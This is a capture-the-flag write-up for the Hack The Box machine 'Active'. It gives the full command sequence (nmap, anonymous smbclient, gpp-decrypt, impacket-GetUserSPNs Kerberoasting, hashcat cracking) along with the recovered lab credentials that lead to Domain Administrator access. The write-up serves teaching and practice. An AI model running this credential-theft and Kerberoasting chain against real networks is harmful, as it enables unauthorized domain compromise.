---
title: "Hack The Box - Active - Writeup"
description: "Abusing Group Policy Preferences credentials and Kerberoasting to compromise an Active Directory domain on Hack The Box Active."

platform: "Hack The Box"
image: "/images/active.png"
difficulty: "Easy"
draft: false

tags:
  - HackTheBox
  - Windows
  - ActiveDirectory
  - SMB
  - Kerberos
  - GPP
  - Kerberoasting
  - Hashcat

categories:
  - HTB

ShowToc: true
TocOpen: true
ShowReadingTime: false
ShowBreadCrumbs: false
---

{{< section >}}

# Overview

Active is a beginner-friendly Active Directory machine that demonstrates how misconfigured Group Policy Preferences can expose domain credentials.

Using an accessible SMB share, it is possible to recover a service account password, perform Kerberoasting against the domain, and ultimately obtain Domain Administrator credentials.

{{< /section >}}

---

{{< section >}}

# Attack Path Summary

```text
Reconnaissance
        ↓
Anonymous SMB Access
        ↓
GPP Credential Discovery
        ↓
Service Account Access
        ↓
Kerberoasting
        ↓
TGS Hash Extraction
        ↓
Offline Password Cracking
        ↓
Domain Administrator Access
```

{{< /section >}}

---

# Reconnaissance

## Nmap Scan

Initial enumeration revealed a Windows Domain Controller hosting several Active Directory services.

```bash
nmap -sVC -Pn -oA nmap/active 10.129.38.84
```

Relevant services:

```text
53/tcp   open  domain
88/tcp   open  kerberos-sec
389/tcp  open  ldap
445/tcp  open  microsoft-ds
3268/tcp open  ldap
```

The presence of Kerberos, LDAP, SMB, and DNS strongly suggested that the target was functioning as an Active Directory Domain Controller.

---

## SMB Enumeration

Enumerating SMB shares revealed that anonymous authentication was enabled.

```bash
smbclient -L //10.129.38.84/
```

```text
Anonymous login successful

NETLOGON
Replication
SYSVOL
Users
```

{{< note >}}

Anonymous access to SMB shares is often a valuable finding in Active Directory environments.

The Replication share was accessible and contained Group Policy files that could be inspected without authentication.

{{< /note >}}

---

# Initial Foothold

## Group Policy Preferences Discovery

While browsing the Replication share, a Group Policy Preferences XML file was discovered.

```text
active.htb/Policies/.../Groups.xml
```

The file contained a `cpassword` value associated with the account:

```text
active.htb\SVC_TGS
```

{{< note >}}

Group Policy Preferences (GPP) historically stored passwords using a reversible encryption mechanism.

Because Microsoft's encryption key became public, any exposed `cpassword` value can be decrypted by attackers.

{{< /note >}}

---

## Password Recovery

The encrypted password was decrypted using `gpp-decrypt`.

```bash
gpp-decrypt <cpassword>
```

Output:

```text
GPPstillStandingStrong2k18
```

Recovered credentials:

```text
SVC_TGS:GPPstillStandingStrong2k18
```

These credentials provided a valid domain account and enabled further Active Directory enumeration.

---

# Privilege Escalation

## Kerberoasting

After authenticating as `SVC_TGS`, enumeration revealed that the Administrator account had a Service Principal Name (SPN) configured.

This made the account vulnerable to Kerberoasting.

```bash
impacket-GetUserSPNs active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -request
```

The command successfully returned a Kerberos TGS service ticket hash for the Administrator account.

{{< note >}}

Kerberoasting abuses Kerberos service tickets by requesting a ticket associated with an SPN-enabled account.

Because the ticket is encrypted using the service account's password hash, it can be cracked offline without interacting with the domain controller.

{{< /note >}}

---

## Cracking the TGS Hash

The extracted TGS hash was saved and cracked using Hashcat.

```bash
hashcat -m 13100 Administrator.hash /usr/share/wordlists/rockyou.txt
```

Hashcat successfully recovered the password:

```text
Ticketmaster1968
```

Recovered credentials:

```text
Administrator:Ticketmaster1968
```

---

## Domain Administrator Access

Using the recovered Administrator credentials provided full administrative access to the domain.

At this point the machine was fully compromised.

---

{{< section >}}

# Skills & Concepts

* SMB Enumeration
* Active Directory Enumeration
* Group Policy Preferences Abuse
* Password Recovery
* Kerberoasting
* Hash Cracking
* Active Directory Privilege Escalation

{{< /section >}}

---

{{< section >}}

# Tools Used

* Nmap
* SMBClient
* GPP-Decrypt
* Impacket
* Hashcat

{{< /section >}}

---

# Lessons Learned

Active is an excellent introductory Active Directory machine because it demonstrates two classic attack techniques frequently encountered during internal penetration tests.

Key takeaways include:

* Enumerating SMB shares thoroughly
* Identifying exposed Group Policy Preference files
* Recovering credentials from GPP passwords
* Enumerating SPNs in Active Directory
* Performing Kerberoasting attacks
* Cracking Kerberos ticket hashes offline

The machine also highlights how a seemingly low-privileged service account can ultimately lead to complete domain compromise.

---